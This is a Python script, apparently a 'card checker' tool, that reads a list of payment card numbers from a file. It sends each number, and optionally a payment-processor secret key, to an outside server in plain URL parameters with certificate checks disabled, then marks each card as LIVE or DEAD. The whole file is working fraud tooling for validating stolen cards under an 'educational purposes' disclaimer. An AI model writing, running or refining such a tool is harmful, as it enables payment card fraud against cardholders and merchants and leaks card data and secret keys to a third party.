from colorama import Fore
import os
import time
import random
import json
import requests

# only for educational purposes please


# v4.1 open source API update

def icon():
    print(Fore.BLUE + '                    v4.1 API - TOOL v1.2')
    print(Fore.BLUE + '               [ XAN CHECKER ]')
    print(Fore.BLUE + ' ')
    print(Fore.BLUE + '                 by roaxx')
    print(Fore.BLUE + '  ')
icon()

with open('config.json', 'r') as file:
    config_data = json.load(file)

cc_file = config_data["cc_file"]
sk_enabled = config_data["enable_sk"]

if sk_enabled is True:
    sk = config_data["sk_key"]
    with open(cc_file, 'r') as requests_file:
        for line in requests_file:
            cx = line.strip()
            url = f"https://liftium.space/manual-sk.php?sk={sk}&cc={cx}" #live api
            try:
            
                response = requests.get(url, verify=False)
            
                if "APPROVED" in response.text:
                    print(Fore.GREEN + "LIVE - " + Fore.LIGHTBLACK_EX + f"{cx} | t: @xancheck")
                    time.sleep(0.7)
                elif "DECLINED" in response.text:
                    print(Fore.RED + "DEAD - " + Fore.LIGHTBLACK_EX + f"{cx}")
                    time.sleep(0.7)
                elif "Request rate limit exceeded" in response.text:
                    print(Fore.YELLOW + "RATELIMIT -" + Fore.LIGHTBLACK_EX + f" {cx}")
                    time.sleep(0.7)
                else:
                    print(Fore.RED + "DEAD - SK KEY DEAD/OR SMTH")
                time.sleep(0.7)
            except requests.RequestException as e:
                print(Fore.RED + f"DEAD - {cx} | {e}")
else:
        print(Fore.YELLOW + 'check @xancheck on telegram.')
        time.sleep(2)
        with open(cc_file, 'r') as requests_file:
            for line in requests_file:
                cx = line.strip()
                url = f"https://liftium.space/xan-free.php?cc={cx}" #2update soon
                try:
            
                    response = requests.get(url, verify=False)
            
                    if "APPROVED" in response.text:
                        print(Fore.GREEN + "LIVE - " + Fore.LIGHTBLACK_EX + f"{cx} | t: @xancheck")
                        time.sleep(0.7)
                    elif "DECLINED" in response.text:
                        print(Fore.RED + "DEAD - " + Fore.LIGHTBLACK_EX + f"{cx} | t: @xancheck")
                        time.sleep(0.7)
                    elif "rate limit" in response.text:
                        print(Fore.YELLOW + "RATELIMIT -" + Fore.LIGHTBLACK_EX + f" {cx}")
                        time.sleep(0.7)
                    else:
                        print(Fore.RED + "api overloaded probly")
                    time.sleep(0.8)
                except requests.RequestException as e:
                    print(Fore.RED + f"DEAD - {cx} | {e}")
                    time.sleep(0.7)



        
